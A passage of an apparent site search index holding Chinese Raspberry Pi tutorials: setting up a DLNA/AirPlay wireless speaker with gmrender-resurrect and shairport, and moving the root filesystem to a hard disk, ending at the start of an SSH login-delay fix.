wlan0"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/","text":"\u6811\u8393\u6d3e\u9999\u6a59\u6d3e\u65e0\u7ebf\u64ad\u653e\uff0c\u5b9e\u73b0DLNA\u4e0eAirPlay\u534f\u8bae\u65e0\u7ebf\u97f3\u7bb1 \u6539\u9020\u6811\u8393\u6d3e\u3001\u9999\u6a59\u6d3e\u6447\u8eab\u4e00\u53d8\u65e0\u7ebfWIFI\u97f3\u54cd\u5728\u7ebf\u64ad\u653e\uff0c\u65e0\u9700\u5b89\u88c5XBMC\u8fd9\u4e2a\u5e9e\u7136\u5927\u7269\u4e5f\u80fd\u5b9e\u73b0DLNA\u548cAirPlay\u53cc\u534f\u8bae\u7684WIFI\u97f3\u54cd\uff0cDLNA \u5b9e\u73b0\u4e8eGmrender-resurrect\u9879\u76ee\u3001AirPlay\u5b9e\u73b0\u4e8eShairport\u9879\u76ee \u51c6\u5907\u5de5\u4f5c \u62ff\u51fa\u4f60\u653e\u5728\u89d2\u843d\u91cc\u79ef\u7070\u7684\u6811\u8393\u6d3e\uff0c\u626b\u626b\u7070\u5c18\uff0c\u5fc5\u8981\u7684\u65f6\u5019\u518d\u629a\u6478\u5b89\u6170\u4e00\u4e0b\uff1f\uff01\u54c8\u54c8\u54c8 \u9009\u8d2d\u4e00\u4e2a\u964d\u566a\u7684USB\u58f0\u5361\uff0c\u6811\u8393\u6d3e\u7684\u58f0\u566a\u6709\u70b9\u60e8\u4e0d\u5fcd\u7779 \u9009\u8d2d\u4e00\u4e2a\u5e72\u6270\u4f4e\u7684\u7535\u6e90\u7ed9\u6811\u8393\u6d3e\u4f9b\u7535 \u9009\u8d2d\u4e00\u4e2a\u597d\u70b9\u7684\u97f3\u54cd\u5e76\u8fde\u63a5\u5230\u6811\u8393\u6d3e \u8ba9\u6811\u8393\u6d3e\u6709\u7ebf/\u65e0\u7ebf\u8fde\u63a5\u4f60\u5230\u5bb6WIFI \u51c6\u5907\u4e00\u4e2a10\u901f\u5185\u5b58\u5361\uff0c\u5e76\u70e7\u5f55\u5b98\u65b9\u7cfb\u7edf DLNA \u534f\u8bae\u9879\u76ee\uff1a gmrender-resurrect AirPlay \u534f\u8bae\u9879\u76ee\uff1a shairport \u5fc5\u8981\u73af\u5883 $ sudo apt-get install git DLNA \u534f\u8bae \u53c2\u8003\u6587\u6863\uff1a https://github.com/hzeller/gmrender-resurrect/blob/master/INSTALL.md \u5b89\u88c5\u4f9d\u8d56 gstreamer1.0-alsa \u53ef\u9009\u4e3a gstreamer1.0-pulseaudio \u8fd9\u4e2a\u8981\u6839\u636e\u81ea\u5df1\u7684\u73af\u5883\u800c\u5b9a\uff0c\u53c2\u8003\u5b98\u65b9\u5e2e\u52a9\u6587\u6863 gmrender-resurrect \u5982\u679c\u4f60\u4e0d\u77e5\u9053\u8fd9\u662f\u4ec0\u4e48\u5c31\u65e0\u89c6\u8fd9\u4e00\u6bb5\u8bdd\u3002 $ sudo apt-get install libupnp-dev libgstreamer1.0-dev gstreamer1.0-plugins-base gstreamer1.0-plugins-good gstreamer1.0-plugins-bad gstreamer1.0-plugins-ugly gstreamer1.0-alsa autoconf \u5b89\u88c5 Gmrender 1\u3001\u5b9a\u4f4d\u5230home\u6587\u4ef6\u5939\u5e76\u514b\u9686\u7a0b\u5e8f\u6e90\u7801 $ cd ../home/$ git clone https://github.com/hzeller/gmrender-resurrect.git 2\u3001\u8f6c\u5230\u521a\u521a\u514b\u9686\u7684gmrender-resurrect\u6587\u4ef6\u5939\u5e76\u5b89\u88c5 $ cd gmrender-resurrect$ ./autogen.sh$ ./configure$ sudo make$ sudo make install 3\u3001\u8f93\u5165\u4e0b\u9762\u7684\u547d\u4ee4\u8fd0\u884c\u670d\u52a1\u5e76\u7528\u7535\u8111\u6216\u8005\u5b89\u5353\u4e00\u7c7b\u652f\u6301DLNA\u64ad\u653e\u7684\u8bbe\u5907\u64ad\u653e\u4e00\u9996\u6b4c\u8bd5\u8bd5\u5427 $ gmediarender -f \"Raspberry-DLNA\" 2 \u8bbe\u7f6e\u5f00\u673a\u81ea\u542f 1\u3001\u62f7\u8d1d\u76f8\u5173\u914d\u7f6e\u6587\u4ef6 $ cp scripts/init.d/gmediarenderer /etc/init.d/ 2\u3001\u5efa\u7acb\u7528\u6237\u7ec4 useradd -g audio gmediarender 3\u3001\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 /etc/init.d/gmediarenderer DAEMON_USER=\"gmediarender:audio\" #\u7528\u6237\u7ec4UPNP_DEVICE_NAME=\"Raspberry-DLNA\" #\u670d\u52a1\u540d\u79f0 4\u3001\u8bbe\u7f6e\u5f00\u673a\u81ea\u542f update-rc.d gmediarenderer defaults AirPlay \u534f\u8bae \u53c2\u8003\u6587\u6863\uff1a https://github.com/abrasive/shairport/wiki \u5b89\u88c5\u4f9d\u8d56 $ apt-get install libssl-dev libavahi-client-dev libasound2-dev libao-dev libpulse-dev \u5b89\u88c5 AirPlay 1\u3001\u5b9a\u4f4d\u5230 home \u6587\u4ef6\u5939\u514b\u9686\u7a0b\u5e8f\u6e90\u7801\u5e76\u5b89\u88c5 $ cd ../home/$ git clone https://github.com/abrasive/shairport.git$ cd shairport$ sudo make$ sudo make install 2\u3001\u542f\u52a8\u670d\u52a1\u7528\u82f9\u679c\u5bb6\u65cf\u8bbe\u5907\u6d4b\u8bd5\u4e00\u4e0b\u80fd\u5426\u6b63\u5e38\u64ad\u653e $ ./shairport -a Raspberry-AirPlay \u8bbe\u7f6e\u5f00\u673a\u81ea\u542f 1\u3001\u62f7\u8d1d\u76f8\u5173\u914d\u7f6e\u6587\u4ef6 $ cp scripts/debian/default/shairport /etc/default/$ cp scripts/debian/init.d/shairport /etc/init.d/$ cp scripts/debian/logrotate.d/shairport /etc/logrotate.d/ 2\u3001\u5efa\u7acb\u7528\u6237\u7ec4 useradd -g audio shairport 3\u3001\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 /etc/init.d/shairport USER=shairport #\u7528\u6237GROUP=audio #\u7528\u6237\u7ec4AP_NAME=Raspberry-AirPlay #\u670d\u52a1\u540d\u79f0 4\u3001\u8bbe\u7f6e\u5f00\u673a\u81ea\u542f update-rc.d shairport defaults \u6700\u7ec8\u6548\u679c \u66f4\u591a\u6559\u7a0b http://raspberrypihq.com/how-to-turn-your-raspberry-pi-into-a-airplay-receiver-to-stream-music-from-your-iphone/ https://blog.wanghw.cn/archives/raspberry-wifisoundtrack.html https://github.com/hzeller/gmrender-resurrect/blob/master/INSTALL.md https://github.com/abrasive/shairport/wiki \u539f\u6587\u94fe\u63a5\uff1a https://www.hscbook.com/article/raspberrypi-audio/","title":"\u6811\u8393\u6d3e\u9999\u6a59\u6d3e\u65e0\u7ebf\u64ad\u653e\uff0c\u5b9e\u73b0DLNA\u4e0eAirPlay\u534f\u8bae\u65e0\u7ebf\u97f3\u7bb1"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#dlnaairplay","text":"\u6539\u9020\u6811\u8393\u6d3e\u3001\u9999\u6a59\u6d3e\u6447\u8eab\u4e00\u53d8\u65e0\u7ebfWIFI\u97f3\u54cd\u5728\u7ebf\u64ad\u653e\uff0c\u65e0\u9700\u5b89\u88c5XBMC\u8fd9\u4e2a\u5e9e\u7136\u5927\u7269\u4e5f\u80fd\u5b9e\u73b0DLNA\u548cAirPlay\u53cc\u534f\u8bae\u7684WIFI\u97f3\u54cd\uff0cDLNA \u5b9e\u73b0\u4e8eGmrender-resurrect\u9879\u76ee\u3001AirPlay\u5b9e\u73b0\u4e8eShairport\u9879\u76ee","title":"\u6811\u8393\u6d3e\u9999\u6a59\u6d3e\u65e0\u7ebf\u64ad\u653e\uff0c\u5b9e\u73b0DLNA\u4e0eAirPlay\u534f\u8bae\u65e0\u7ebf\u97f3\u7bb1"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_1","text":"\u62ff\u51fa\u4f60\u653e\u5728\u89d2\u843d\u91cc\u79ef\u7070\u7684\u6811\u8393\u6d3e\uff0c\u626b\u626b\u7070\u5c18\uff0c\u5fc5\u8981\u7684\u65f6\u5019\u518d\u629a\u6478\u5b89\u6170\u4e00\u4e0b\uff1f\uff01\u54c8\u54c8\u54c8 \u9009\u8d2d\u4e00\u4e2a\u964d\u566a\u7684USB\u58f0\u5361\uff0c\u6811\u8393\u6d3e\u7684\u58f0\u566a\u6709\u70b9\u60e8\u4e0d\u5fcd\u7779 \u9009\u8d2d\u4e00\u4e2a\u5e72\u6270\u4f4e\u7684\u7535\u6e90\u7ed9\u6811\u8393\u6d3e\u4f9b\u7535 \u9009\u8d2d\u4e00\u4e2a\u597d\u70b9\u7684\u97f3\u54cd\u5e76\u8fde\u63a5\u5230\u6811\u8393\u6d3e \u8ba9\u6811\u8393\u6d3e\u6709\u7ebf/\u65e0\u7ebf\u8fde\u63a5\u4f60\u5230\u5bb6WIFI \u51c6\u5907\u4e00\u4e2a10\u901f\u5185\u5b58\u5361\uff0c\u5e76\u70e7\u5f55\u5b98\u65b9\u7cfb\u7edf DLNA \u534f\u8bae\u9879\u76ee\uff1a gmrender-resurrect AirPlay \u534f\u8bae\u9879\u76ee\uff1a shairport","title":"\u51c6\u5907\u5de5\u4f5c"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_2","text":"$ sudo apt-get install git","title":"\u5fc5\u8981\u73af\u5883"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#dlna","text":"\u53c2\u8003\u6587\u6863\uff1a https://github.com/hzeller/gmrender-resurrect/blob/master/INSTALL.md","title":"DLNA \u534f\u8bae"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_3","text":"gstreamer1.0-alsa \u53ef\u9009\u4e3a gstreamer1.0-pulseaudio \u8fd9\u4e2a\u8981\u6839\u636e\u81ea\u5df1\u7684\u73af\u5883\u800c\u5b9a\uff0c\u53c2\u8003\u5b98\u65b9\u5e2e\u52a9\u6587\u6863 gmrender-resurrect \u5982\u679c\u4f60\u4e0d\u77e5\u9053\u8fd9\u662f\u4ec0\u4e48\u5c31\u65e0\u89c6\u8fd9\u4e00\u6bb5\u8bdd\u3002 $ sudo apt-get install libupnp-dev libgstreamer1.0-dev gstreamer1.0-plugins-base gstreamer1.0-plugins-good gstreamer1.0-plugins-bad gstreamer1.0-plugins-ugly gstreamer1.0-alsa autoconf","title":"\u5b89\u88c5\u4f9d\u8d56"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#gmrender","text":"1\u3001\u5b9a\u4f4d\u5230home\u6587\u4ef6\u5939\u5e76\u514b\u9686\u7a0b\u5e8f\u6e90\u7801 $ cd ../home/$ git clone https://github.com/hzeller/gmrender-resurrect.git 2\u3001\u8f6c\u5230\u521a\u521a\u514b\u9686\u7684gmrender-resurrect\u6587\u4ef6\u5939\u5e76\u5b89\u88c5 $ cd gmrender-resurrect$ ./autogen.sh$ ./configure$ sudo make$ sudo make install 3\u3001\u8f93\u5165\u4e0b\u9762\u7684\u547d\u4ee4\u8fd0\u884c\u670d\u52a1\u5e76\u7528\u7535\u8111\u6216\u8005\u5b89\u5353\u4e00\u7c7b\u652f\u6301DLNA\u64ad\u653e\u7684\u8bbe\u5907\u64ad\u653e\u4e00\u9996\u6b4c\u8bd5\u8bd5\u5427 $ gmediarender -f \"Raspberry-DLNA\" 2","title":"\u5b89\u88c5 Gmrender"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_4","text":"1\u3001\u62f7\u8d1d\u76f8\u5173\u914d\u7f6e\u6587\u4ef6 $ cp scripts/init.d/gmediarenderer /etc/init.d/ 2\u3001\u5efa\u7acb\u7528\u6237\u7ec4 useradd -g audio gmediarender 3\u3001\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 /etc/init.d/gmediarenderer DAEMON_USER=\"gmediarender:audio\" #\u7528\u6237\u7ec4UPNP_DEVICE_NAME=\"Raspberry-DLNA\" #\u670d\u52a1\u540d\u79f0 4\u3001\u8bbe\u7f6e\u5f00\u673a\u81ea\u542f update-rc.d gmediarenderer defaults","title":"\u8bbe\u7f6e\u5f00\u673a\u81ea\u542f"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#airplay","text":"\u53c2\u8003\u6587\u6863\uff1a https://github.com/abrasive/shairport/wiki","title":"AirPlay \u534f\u8bae"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_5","text":"$ apt-get install libssl-dev libavahi-client-dev libasound2-dev libao-dev libpulse-dev","title":"\u5b89\u88c5\u4f9d\u8d56"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#airplay_1","text":"1\u3001\u5b9a\u4f4d\u5230 home \u6587\u4ef6\u5939\u514b\u9686\u7a0b\u5e8f\u6e90\u7801\u5e76\u5b89\u88c5 $ cd ../home/$ git clone https://github.com/abrasive/shairport.git$ cd shairport$ sudo make$ sudo make install 2\u3001\u542f\u52a8\u670d\u52a1\u7528\u82f9\u679c\u5bb6\u65cf\u8bbe\u5907\u6d4b\u8bd5\u4e00\u4e0b\u80fd\u5426\u6b63\u5e38\u64ad\u653e $ ./shairport -a Raspberry-AirPlay","title":"\u5b89\u88c5 AirPlay"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_6","text":"1\u3001\u62f7\u8d1d\u76f8\u5173\u914d\u7f6e\u6587\u4ef6 $ cp scripts/debian/default/shairport /etc/default/$ cp scripts/debian/init.d/shairport /etc/init.d/$ cp scripts/debian/logrotate.d/shairport /etc/logrotate.d/ 2\u3001\u5efa\u7acb\u7528\u6237\u7ec4 useradd -g audio shairport 3\u3001\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 /etc/init.d/shairport USER=shairport #\u7528\u6237GROUP=audio #\u7528\u6237\u7ec4AP_NAME=Raspberry-AirPlay #\u670d\u52a1\u540d\u79f0 4\u3001\u8bbe\u7f6e\u5f00\u673a\u81ea\u542f update-rc.d shairport defaults","title":"\u8bbe\u7f6e\u5f00\u673a\u81ea\u542f"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_7","text":"","title":"\u6700\u7ec8\u6548\u679c"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/#_8","text":"http://raspberrypihq.com/how-to-turn-your-raspberry-pi-into-a-airplay-receiver-to-stream-music-from-your-iphone/ https://blog.wanghw.cn/archives/raspberry-wifisoundtrack.html https://github.com/hzeller/gmrender-resurrect/blob/master/INSTALL.md https://github.com/abrasive/shairport/wiki \u539f\u6587\u94fe\u63a5\uff1a https://www.hscbook.com/article/raspberrypi-audio/","title":"\u66f4\u591a\u6559\u7a0b"},{"location":"RPI/%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8%E6%A0%91%E8%8E%93%E6%B4%BE%EF%BC%93B/","text":"\u786c\u76d8\u542f\u52a8\u6811\u8393\u6d3e\uff0c\u9632\u6b62\uff34\uff26\u5361\u635f\u574f\uff0e\u6b65\u9aa4\uff1a \uff11\u3000\u5728\uff30\uff23\u4e0a\u683c\u5f0f\u5316\u786c\u76d8\uff1a sudo mkfs.ext4 /dev/sdc2\u3000\u3000\uff03\u4ee5ext\uff14\u683c\u5f0f\u5316\u5206\u533a/dev/sdc2 sudo e2label /dev/sdc2 ROOT #\u8bbe\u7f6e\u6807\u7b7e\u4e3aROOT sudo mount /dev/sdc2 /work/2T/\u3000\uff03\u6302\u8f7d\u78c1\u76d8\u5230\u76ee\u5f55/work/2T/ \uff12\u6302\u8f7d\u5907\u4efd\u7684\u78c1\u76d8\u955c\u50cf\u5230\u76ee\u5f55\uff1a sudo mount -o loop,offset=209715200 /media/hamilton/work/RPI_dd_20201209.img /mnt/ \u53c2\u8003 https://www.linuxquestions.org/questions/linux-general-1/how-to-mount-img-file-882386/ \u8ba1\u7b97\u6302\u8f7d\u7684offset. \u5982\u4e0b\u6240\u793a\u6211\u7684\u955c\u50cf\u91cc\u6709\u6765\u4e24\u4e2a\u5206\u533a\uff0c\u7b2c\u4e8c\u4e2a\u5206\u533a\u4e3awritable\uff0c\u4ed6\u7684offset\u8ba1\u7b97\u4e3a512\u00d7409600 $ fdisk -l RPI_dd_20201209.img Disk RPI_dd_20201209.img: 14.9 GiB, 15931539456 bytes, 31116288 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0x7fe6d224 Device Boot Start End Sectors Size Id Type RPI_dd_20201209.img1 2048 409599 407552 199M c W95 FAT32 (LBA) RPI_dd_20201209.img2 409600 30244830 29835231 14.2G 83 Linux 3 \u540c\u6b65\uff32\uff2f\uff2f\uff34\u5206\u533a\u5230\u78c1\u76d8\uff1a sudo rsync -axv /mnt/* /work/2T/ \uff14\u68c0\u67e5\u78c1\u76d8\u7684\uff35\uff35\uff29\uff24\uff1a sudo blkid \uff15\u3000\u4fee\u6539fstab UUID=45b9a54a-c68e-441d-9fe9-da55966e6f34 / ext4 defaults,noatime 0 0 \u5e76\u589e\u52a0 # \u5230\u539f\u6765\u7684ROOT\u78c1\u76d8\uff08\u6b64\u5904\u6307\uff34\uff26\u5361\uff09: #LABEL=writable / ext4 defaults,noatime 0 0 6 \u4fee\u6539 config: cat /boot/firmware/config.txt \u5728\u6587\u4ef6\u4e2d\u53d1\u73b0\u5199\u6709\uff1a cmdline=nobtcmd.txt , \u6240\u4ee5 : \u7f16\u8f91 /boot/firmware/nobtcmd.txt \u4fee\u6539 root=LABEL=\"writable\" \u4e3a root=LABEL=\"ROOT\" , \u6700\u7ec8\u5185\u5bb9\u5982\u4e0b\uff1a net.ifnames=0 dwc_otg.lpm_enable=0 console=ttyAMA0,115200 console=tty1 root=LABEL=\"ROOT\" rootfstype=ext4 elevator=deadline rootwait 7 \u91cd\u542f\uff0c\u68c0\u67e5 \u5728\u6811\u8393\u6d3e\u4e0a\u63d2\u5165\uff34\uff26\u5361\uff0c\u63a5\u5165\u786c\u76d8\uff0c\u5f00\u673a\u540e\u8f93\u5165df -h \u786e\u8ba4/\u6302\u5728\u5728\u6211\u4eec\u7684\u78c1\u76d8\u4e0a,\u3000\u5982\u4e0b: /dev/sda2 19G 9.4G 8.7G 52% / \u8bf4\u660e \uff1a\uff34\uff26\u5728\u6811\u8393\u6d3e\u4e0a\u8fd8\u662f\u8981\u7684\uff0c\u4f46\u662f\u4e0d\u4f1a\u88ab\u9891\u7e41\u5199\u5bfc\u81f4\u635f\u574f\uff0e \u539f\u6587\u94fe\u63a5\uff1a http://droid10.com/2021/02/25/\u786c\u76d8\u542f\u52a8\u6811\u8393\u6d3e\uff13b/","title":"\u786c\u76d8\u542f\u52a8\u6811\u8393\u6d3e\uff13B"},{"location":"RPI/%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8%E6%A0%91%E8%8E%93%E6%B4%BE%EF%BC%93B/#1-pc","text":"sudo mkfs.ext4 /dev/sdc2\u3000\u3000\uff03\u4ee5ext\uff14\u683c\u5f0f\u5316\u5206\u533a/dev/sdc2 sudo e2label /dev/sdc2 ROOT #\u8bbe\u7f6e\u6807\u7b7e\u4e3aROOT sudo mount /dev/sdc2 /work/2T/\u3000\uff03\u6302\u8f7d\u78c1\u76d8\u5230\u76ee\u5f55/work/2T/","title":"\uff11\u3000\u5728\uff30\uff23\u4e0a\u683c\u5f0f\u5316\u786c\u76d8\uff1a"},{"location":"RPI/%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8%E6%A0%91%E8%8E%93%E6%B4%BE%EF%BC%93B/#2","text":"sudo mount -o loop,offset=209715200 /media/hamilton/work/RPI_dd_20201209.img /mnt/ \u53c2\u8003 https://www.linuxquestions.org/questions/linux-general-1/how-to-mount-img-file-882386/ \u8ba1\u7b97\u6302\u8f7d\u7684offset. \u5982\u4e0b\u6240\u793a\u6211\u7684\u955c\u50cf\u91cc\u6709\u6765\u4e24\u4e2a\u5206\u533a\uff0c\u7b2c\u4e8c\u4e2a\u5206\u533a\u4e3awritable\uff0c\u4ed6\u7684offset\u8ba1\u7b97\u4e3a512\u00d7409600 $ fdisk -l RPI_dd_20201209.img Disk RPI_dd_20201209.img: 14.9 GiB, 15931539456 bytes, 31116288 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0x7fe6d224 Device Boot Start End Sectors Size Id Type RPI_dd_20201209.img1 2048 409599 407552 199M c W95 FAT32 (LBA) RPI_dd_20201209.img2 409600 30244830 29835231 14.2G 83 Linux","title":"\uff12\u6302\u8f7d\u5907\u4efd\u7684\u78c1\u76d8\u955c\u50cf\u5230\u76ee\u5f55\uff1a"},{"location":"RPI/%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8%E6%A0%91%E8%8E%93%E6%B4%BE%EF%BC%93B/#3-root","text":"sudo rsync -axv /mnt/* /work/2T/","title":"3 \u540c\u6b65\uff32\uff2f\uff2f\uff34\u5206\u533a\u5230\u78c1\u76d8\uff1a"},{"location":"RPI/%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8%E6%A0%91%E8%8E%93%E6%B4%BE%EF%BC%93B/#4uuid","text":"sudo blkid","title":"\uff14\u68c0\u67e5\u78c1\u76d8\u7684\uff35\uff35\uff29\uff24\uff1a"},{"location":"RPI/%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8%E6%A0%91%E8%8E%93%E6%B4%BE%EF%BC%93B/#5-fstab","text":"UUID=45b9a54a-c68e-441d-9fe9-da55966e6f34 / ext4 defaults,noatime 0 0 \u5e76\u589e\u52a0 # \u5230\u539f\u6765\u7684ROOT\u78c1\u76d8\uff08\u6b64\u5904\u6307\uff34\uff26\u5361\uff09: #LABEL=writable / ext4 defaults,noatime 0 0","title":"\uff15\u3000\u4fee\u6539fstab"},{"location":"RPI/%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8%E6%A0%91%E8%8E%93%E6%B4%BE%EF%BC%93B/#6-config","text":"cat /boot/firmware/config.txt \u5728\u6587\u4ef6\u4e2d\u53d1\u73b0\u5199\u6709\uff1a cmdline=nobtcmd.txt , \u6240\u4ee5 : \u7f16\u8f91 /boot/firmware/nobtcmd.txt \u4fee\u6539 root=LABEL=\"writable\" \u4e3a root=LABEL=\"ROOT\" , \u6700\u7ec8\u5185\u5bb9\u5982\u4e0b\uff1a net.ifnames=0 dwc_otg.lpm_enable=0 console=ttyAMA0,115200 console=tty1 root=LABEL=\"ROOT\" rootfstype=ext4 elevator=deadline rootwait","title":"6 \u4fee\u6539 config:"},{"location":"RPI/%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8%E6%A0%91%E8%8E%93%E6%B4%BE%EF%BC%93B/#7","text":"\u5728\u6811\u8393\u6d3e\u4e0a\u63d2\u5165\uff34\uff26\u5361\uff0c\u63a5\u5165\u786c\u76d8\uff0c\u5f00\u673a\u540e\u8f93\u5165df -h \u786e\u8ba4/\u6302\u5728\u5728\u6211\u4eec\u7684\u78c1\u76d8\u4e0a,\u3000\u5982\u4e0b: /dev/sda2 19G 9.4G 8.7G 52% / \u8bf4\u660e \uff1a\uff34\uff26\u5728\u6811\u8393\u6d3e\u4e0a\u8fd8\u662f\u8981\u7684\uff0c\u4f46\u662f\u4e0d\u4f1a\u88ab\u9891\u7e41\u5199\u5bfc\u81f4\u635f\u574f\uff0e \u539f\u6587\u94fe\u63a5\uff1a http://droid10.com/2021/02/25/\u786c\u76d8\u542f\u52a8\u6811\u8393\u6d3e\uff13b/","title":"7 \u91cd\u542f\uff0c\u68c0\u67e5"},{"location":"RPI/%E8%A7%A3%E5%86%B3%E6%A0%91%E8%8E%93%E6%B4%BESSH%E7%99%BB%E5%BD%95%E7%BC%93%E6%85%A2%E7%9A%84%E9%97%AE%E9%A2%98_Maoning%20Guan%E7%9A%84%E5%8D%9A%E5%AE%A2-CSDN%E5%8D%9A%E5%AE%A2/","text":"\u89e3\u51b3\u6811\u8393\u6d3eSSH\u767b\u5f55\u7f13\u6162\u7684\u95ee\u9898_Maoning Guan\u7684\u535a\u5ba2-CSDN\u535a\u5ba2 \u7cfb\u7edf\uff1a \u6811\u8393\u6d3e\uff1a\u6811\u8393\u6d3e3\u4ee3B \u7cfb\u7edf\uff1araspbian \u95ee\u9898\uff1a \u6211\u4eec\u5728\u7528SSH\u767b\u5f55\u6811\u8393\u6d3e\u7684\u65f6\u5019\uff0c\u8f93\u5165\u7528\u6237\u540d\u4e4b\u540e\uff0c\u5f80\u5f80\u9700\u8981\u7b49\u5f8510\u591a\u79d2\u751a\u81f320\u591a\u79d230\u79d2\u624d\u80fd\u5f39\u51fa\u8f93\u5165\u5bc6\u7801\u7684\u9009\u9879\uff0c\u8fd9\u4e2a\u662f\u56e0\u4e3a\u6811\u8393\u6d3e\u5f00\u542f\u4e86gssapi\u8ba4\u8bc1\uff0cgsspi\u662f\u4e00\u79cd\u5de5\u4e1a\u6807\u51c6\u534f\u8bae\uff0c\u53ef\u7528\u4e8eSSH\u8fde\u63a5\u8ba4\u8bc1\u3002 \u89e3\u51b3\u65b9\u6cd5\uff1a 